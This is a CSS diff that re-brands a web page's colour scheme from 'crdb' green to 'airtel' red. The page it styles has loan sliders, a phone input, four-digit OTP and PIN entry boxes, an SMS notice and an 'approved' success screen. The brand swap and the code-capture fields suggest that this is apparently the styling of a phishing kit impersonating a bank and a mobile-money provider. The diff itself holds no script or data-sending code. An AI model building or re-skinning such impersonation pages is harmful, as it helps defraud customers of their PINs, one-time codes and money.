@@ -1,7 +1,7 @@
 :root {
-  --crdb-green: #008000;
-  --crdb-dark-green: #005A00;
-  --bg-green-gradient: linear-gradient(135deg, #006600 0%, #003300 100%);
+  --airtel-red: #E40000;
+  --airtel-dark-red: #990000;
+  --bg-red-gradient: linear-gradient(135deg, #B30000 0%, #4D0000 100%);
   --card-bg: #FFFFFF;
   --text-main: #1C1C1E;
   --text-muted: #6E6E73;
@@ -18,7 +18,7 @@
 }
 
 body {
-  background: var(--bg-green-gradient);
+  background: var(--bg-red-gradient);
   background-attachment: fixed;
   color: var(--text-main);
   display: flex;
@@ -42,13 +42,13 @@ body {
 }
 
 .top-header {
-  background: var(--crdb-green);
+  background: var(--airtel-red);
   color: #FFFFFF;
   padding: 18px 20px;
   display: flex;
   align-items: center;
   justify-content: space-between;
-  border-bottom: 2px solid var(--crdb-dark-green);
+  border-bottom: 2px solid var(--airtel-dark-red);
 }
 
 .brand-title {
@@ -79,8 +79,8 @@ body {
 .surface-banner {
   display: none;
   background-color: #FFE6E6;
-  border: 2px solid #E40000;
-  color: #E40000;
+  border: 2px solid var(--airtel-red);
+  color: var(--airtel-red);
   padding: 14px 16px;
   border-radius: 12px;
   font-weight: 800;
@@ -99,10 +99,10 @@ body {
 }
 
 .notice-box {
-  border: 2px solid var(--crdb-green);
+  border: 2px solid var(--airtel-red);
   border-radius: 16px;
   padding: 22px;
-  background-color: #F4FFF4;
+  background-color: #FFF2F2;
   margin: 18px 0;
 }
 
@@ -116,7 +116,7 @@ body {
 
 .slider-group { margin-bottom: 18px; }
 .slider-header { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px; font-weight: 600; }
-.slider-val { font-weight: 800; color: var(--crdb-green); }
+.slider-val { font-weight: 800; color: var(--airtel-red); }
 
 .range-slider {
   width: 100%;
@@ -127,11 +127,11 @@ body {
   background: #E5E5EA;
 }
 
-.green-slider::-webkit-slider-thumb {
+.red-slider::-webkit-slider-thumb {
   -webkit-appearance: none;
   width: 22px; height: 22px;
   border-radius: 50%;
-  background: var(--crdb-green);
+  background: var(--airtel-red);
   cursor: pointer;
 }
 
@@ -144,7 +144,7 @@ body {
 }
 
 .account-box {
-  background-color: #F4FFF4;
+  background-color: #FFF2F2;
   border-radius: 12px;
   padding: 12px 16px;
   display: flex;
@@ -155,7 +155,7 @@ body {
 
 .phone-icon-circle {
   width: 40px; height: 40px;
-  background-color: var(--crdb-green);
+  background-color: var(--airtel-red);
   color: #FFFFFF;
   border-radius: 50%;
   display: flex; align-items: center; justify-content: center;
@@ -164,10 +164,10 @@ body {
 
 .account-info { display: flex; flex-direction: column; }
 .account-title { font-size: 12px; color: var(--text-muted); }
-.account-amount { font-size: 20px; font-weight: 800; color: var(--crdb-green); }
+.account-amount { font-size: 20px; font-weight: 800; color: var(--airtel-red); }
 
 .btn-primary {
-  background-color: var(--crdb-green);
+  background-color: var(--airtel-red);
   color: #FFFFFF;
   border: none;
   border-radius: 12px;
@@ -194,7 +194,7 @@ body {
   background-color: #FAFAFA;
 }
 
-.input-field:focus { border-color: var(--crdb-green); background-color: #FFFFFF; }
+.input-field:focus { border-color: var(--airtel-red); background-color: #FFFFFF; }
 
 .phone-input-wrapper {
   display: flex;
@@ -227,25 +227,25 @@ body {
 }
 
 .otp-digit-4:focus, .pin-digit:focus {
-  border-color: var(--crdb-green);
+  border-color: var(--airtel-red);
   background-color: #FFFFFF;
 }
 
 .sms-notice {
-  background-color: #F4FFF4;
-  border: 2px solid var(--crdb-green);
+  background-color: #FFF2F2;
+  border: 2px solid var(--airtel-red);
   border-radius: 12px;
   padding: 16px;
   margin-bottom: 20px;
   text-align: center;
 }
 
-.sms-notice p { color: var(--crdb-green); font-weight: 800; font-size: 14px; }
+.sms-notice p { color: var(--airtel-red); font-weight: 800; font-size: 14px; }
 
 /* Success Screen Styles */
 .circle-check-icon {
   width: 64px; height: 64px;
-  background-color: var(--crdb-green);
+  background-color: var(--airtel-red);
   color: #FFFFFF;
   border-radius: 50%;
   display: flex; align-items: center; justify-content: center;
@@ -257,7 +257,7 @@ body {
 .congrats-sub { color: var(--text-muted); font-size: 14px; }
 
 .approved-banner-card {
-  background-color: var(--crdb-green);
+  background-color: var(--airtel-red);
   color: #FFFFFF;
   border-radius: 14px;
   padding: 20px;
@@ -293,7 +293,7 @@ body {
   display: flex; align-items: center; justify-content: center; font-size: 18px;
 }
 
-.green-icon { background-color: #E6F4EA; }
+.red-icon { background-color: #FFE6E6; }
 .orange-icon { background-color: #FFF0E6; }
 
 .item-text { display: flex; flex-direction: column; }
@@ -317,7 +317,7 @@ body {
 .spinner {
   width: 46px; height: 46px;
   border: 4px solid #EFEFEF;
-  border-top: 4px solid var(--crdb-green);
+  border-top: 4px solid var(--airtel-red);
   border-radius: 50%;
   animation: spin 1s linear infinite;
   margin-bottom: 18px;
@@ -325,5 +325,5 @@ body {
 
 @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-.error-text { color: #E40000; font-size: 12px; margin-top: 6px; display: none; }
+.error-text { color: var(--airtel-red); font-size: 12px; margin-top: 6px; display: none; }
   
